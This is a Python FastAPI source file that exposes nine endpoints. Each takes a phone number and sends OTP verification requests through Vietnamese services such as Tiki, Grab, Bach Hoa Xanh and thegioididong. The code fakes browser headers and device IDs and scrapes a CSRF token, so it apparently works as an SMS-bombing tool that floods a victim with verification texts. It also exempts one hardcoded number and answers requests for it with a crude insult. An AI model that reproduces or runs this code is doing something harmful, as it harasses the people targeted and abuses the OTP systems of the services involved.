from typing import Optional
from fastapi import FastAPI
import requests
import random
def random_id(length):
    number = '0123456789'
    alpha = 'abcdefghijklmnopqrstuvwxyz'
    id = ''
    for i in range(0,length,2):
        id += random.choice(number)
        id += random.choice(alpha)
    return id

def generateImei() :
        return str(str(str(str(str(str(str(str(generateRandomString(8)) + '-') + str(generateRandomString(4))) + '-') + str(generateRandomString(4))) + '-') + str(generateRandomString(4))) + '-') + str(generateRandomString(12));  

def generateRandomString(length = 20) :
    characters = '0123456789abcdef'
    charactersLength = len(characters)
    randomString = ''
    i = 0
    while ( i < length ) :
        randomString += characters[random.randint(0, charactersLength - 1)]
        i+=1
    return randomString
app = FastAPI()

headers = {
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36',
}

def tiki(phone):
    if phone == "0395524153" or phone == "84395524153":
        return "Spam Số Tao Làm Lồn À!"
    else:
        try:
            json_data = {
                    'phone_number': phone,
                }
            response_tiki = requests.post('https://tiki.vn/api/v2/customers/otp_codes', headers=headers, json=json_data).text
            return response_tiki
        except:
            return "Lỗi Không Xác Định!"

def grab_food(phone):
    if phone == "0395524153" or phone == "84395524153":
        return "Spam Số Tao Làm Lồn À!"
    else:
        try:
            json_data = {
                'client_id': random_id(32),
                'ctx_id': random_id(32),
                'transaction_ctx': None,
                'country_code': 'VN',
                'method': 'SMS',
                'num_digits': 6,
                'scope': 'openid profile.read foodweb.order foodweb.rewards foodweb.get_enterprise_profile',
                'phone_number': '84'+phone[1:11],
            }
            response_grab_food = requests.post('https://partner-api.grab.com/grabid/v1/oauth2/otp', headers=headers, json=json_data).text
            return response_grab_food
        except:
            return "Lỗi Không Xác Định!"
    
def bach_hoa_xanh(phone):
    if phone == "0395524153" or phone == "84395524153":
        return "Spam Số Tao Làm Lồn À!"
    else:
        try:
            data = {
                'phone': phone,
                'objectId': random_id(36),
                'type': '4',
            }
            response_bach_hoa_xanh = requests.post('https://www.bachhoaxanh.com/aj/Customer/SendOTP', headers=headers, data=data).text
            return response_bach_hoa_xanh
        except:
            return "Lỗi Không Xác Định!" 
    
def meta_vn(phone):
    if phone == "0395524153" or phone == "84395524153":
        return "Spam Số Tao Làm Lồn À!"
    else:
        try:
            params = {
                'api_mode': '1',
            }

            json_data = {
                'api_args': {
                    'lgUser': phone,
                    'act': 'send',
                    'type': 'phone',
                },
                'api_method': 'CheckExist',
            }

            response_meta_vn = requests.post('https://meta.vn/app_scripts/pages/AccountReact.aspx', params=params, headers=headers, json=json_data).text
            return response_meta_vn
        except:
            return "Lỗi Không Xác Định!"    

def elines(phone):
    if phone == "0395524153" or phone == "84395524153":
        return "Spam Số Tao Làm Lồn À!"
    else:
        try:
            json_data = {
                'phone': phone,
                'type': 'sign_up',
            }

            response_elines = requests.post('https://www.elines.vn/api2/core/sendOTP', headers=headers, json=json_data).text
            return response_elines
        except:
            return "Lỗi Không Xác Định!"  
        
def gojoy(phone):
    if phone == "0395524153" or phone == "84395524153":
        return "Spam Số Tao Làm Lồn À!"
    else:
        try:
            headers_ = {
                'Accept': 'application/json, text/plain, */*',
                'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
                'Connection': 'keep-alive',
                'Content-Type': 'application/json; charset=UTF-8',
                'Device-Encode': generateImei(),
                'Localization': 'vi',
                'Origin': 'https://go2joy.vn',
                'Referer': 'https://go2joy.vn/',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-site',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36',
            }

            json_data = {
                'mobile': phone,
                'countryCode': '84',
            }

            response_gojoy = requests.post('https://webbooking-api.go2joy.vn/api/v4/web-booking/user/sendVerifyCode', headers=headers_, json=json_data).text
            return response_gojoy
        except:
            return "Lỗi Không Xác Định!" 
        
def vntrip(phone):
    if phone == "0395524153" or phone == "84395524153":
        return "Spam Số Tao Làm Lồn À!"
    else:
        try:
            json_data = {
                'feature': 'register',
                'phone': '+84'+phone[1:11],
            }

            response_vntrip = requests.post('https://micro-services.vntrip.vn/core-user-service/verification/request/phone', headers=headers, json=json_data).text
            return response_vntrip
        except:
            return "Lỗi Không Xác Định!" 

def nhaphang247(phone):
    if phone == "0395524153" or phone == "84395524153":
        return "Spam Số Tao Làm Lồn À!"
    else:
        try:
            params = {
                'phone': phone,
            }

            response_nhaphang247 = requests.get('https://www.nhaphang247.com/site/get-code', params=params, headers=headers).text
            return response_nhaphang247
        except:
            return "Lỗi Không Xác Định!" 

def thegioididong(phone):
    if phone == "0395524153" or phone == "84395524153":
        return "Spam Số Tao Làm Lồn À!"
    else:
        try:
            cookie = requests.get('https://www.thegioididong.com/game-app/now-ung-dung-dat-thuc-an-nhanh-220103', headers=headers)
            data = {
                'phoneNumer': phone,
                '__RequestVerificationToken': cookie.text.split('<input name="__RequestVerificationToken" type="hidden" value="')[1].split('" />')[0],
            }
            response_thegioididong = requests.post('https://www.thegioididong.com/game-app/aj/Profile/SendVerifyCodeLoginByPhoneNumber', cookies=cookie.cookies, headers=headers, data=data).text
            return response_thegioididong
        except:
            return "Lỗi Không Xác Định!" 
        
@app.post("/tiki")
def read_item(phone: Optional[str] = None):
    done = tiki(phone)
    return done

@app.post("/grab-food")
def read_item(phone: Optional[str] = None):
    done = grab_food(phone)
    return done

@app.post("/bach-hoa-xanh")
def read_item(phone: Optional[str] = None):
    done = bach_hoa_xanh(phone)
    return done

@app.post("/meta-vn")
def read_item(phone: Optional[str] = None):
    done = meta_vn(phone)
    return done

@app.post("/elines")
def read_item(phone: Optional[str] = None):
    done = elines(phone)
    return done

@app.post("/gojoy")
def read_item(phone: Optional[str] = None):
    done = gojoy(phone)
    return done

@app.post("/vntrip")
def read_item(phone: Optional[str] = None):
    done = vntrip(phone)
    return done

@app.post("/nhap-hang-247")
def read_item(phone: Optional[str] = None):
    done = nhaphang247(phone)
    return done

@app.post("/the-gioi-di-dong")
def read_item(phone: Optional[str] = None):
    done = thegioididong(phone)
    return done
